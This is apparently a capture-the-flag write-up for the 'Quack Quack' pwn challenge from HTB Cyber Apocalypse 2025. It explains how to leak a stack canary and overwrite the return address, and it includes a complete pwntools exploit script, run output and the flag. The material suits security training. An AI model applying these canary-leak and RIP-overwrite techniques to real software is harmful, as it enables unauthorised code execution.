# 2025 HTB Cyber Apocalypse - Quack Quack

Simple pwn challenge where we have to overwrite RIP to jump to `duck_attack` function that prints out the flag. The binary had stack canary checks so we first had to leak the canary by specifying "Quack Quack" keywords at the end of the string so the stack canary value gets printed out to stdout. Here is the binary disassembly:

```
  printf("Quack the Duck!\n\n> ");
  fflush(stdout);
  read(0,local_88,0x66);
  pcVar1 = strstr(local_88,"Quack Quack ");
  if (pcVar1 == (char *)0x0) {
    error("Where are your Quack Manners?!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x520);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ",pcVar1 + 0x20);
  read(0,&local_68,0x6a);
  puts("Did you really expect to win a fight against a Duck?!\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
```

Once the stack canary is leaked, we can overwrite RIP to `duck_attack` and win.
```
from pwn import *

e = ELF('quack_quack')

print(e.sym["duck_attack"])

payload = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack "

r = process("quack_quack")
#gdb.attach(r, '''
#set follow-fork-mode child
#break *0x004015c4
#continue
#''')
r.recvuntil(b"> ")
r.sendline(payload)
leak = r.readline()

r.recvuntil(b"> ")

leak = leak.split(b", ready")[0][len(b"Quack Quack "):]
print(leak)

payload = b"B" * 0x58 + b"\x00" + leak[:7] + leak[7:] + b"\x00"*(8-len(leak[7:])) + p64(e.sym["duck_attack"])
r.sendline(payload)
r.interactive()
```

Local execution:
```
$ python3 xpl.py 
[*] '/home/vm/Documents/htbctf/pwn_quack_quack/quack_quack'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
4199295
[!] Could not find executable 'quack_quack' in $PATH, using './quack_quack' instead
[+] Starting local process './quack_quack': pid 11434
b'"\xe9]B\x826\xd5\xd0\t\xc85\xfc\x7f'
[*] Switching to interactive mode
Did you really expect to win a fight against a Duck?!

HTB{f4k3_fl4g_4_t35t1ng}
[*] Got EOF while reading in interactive
$ 
[*] Interrupted
[*] Process './quack_quack' stopped with exit code -11 (SIGSEGV) (pid 11434)
```

```
HTB{~c4n4ry_g035_qu4ck_qu4ck~_c2a31fa673b91ec8c1150e79501d3e37}
```
